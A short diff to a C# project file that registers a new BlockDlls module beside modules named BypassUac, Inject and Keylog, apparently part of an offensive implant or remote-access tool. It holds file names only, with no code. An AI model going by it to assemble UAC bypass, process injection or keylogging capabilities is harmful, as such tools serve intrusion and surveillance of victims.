@@ -121,6 +121,7 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="CommandModules\BlockDlls.cs" />
     <Compile Include="CommandModules\BypassUac.cs" />
     <Compile Include="CommandModules\Inject.cs" />
     <Compile Include="CommandModules\Keylog.cs" />
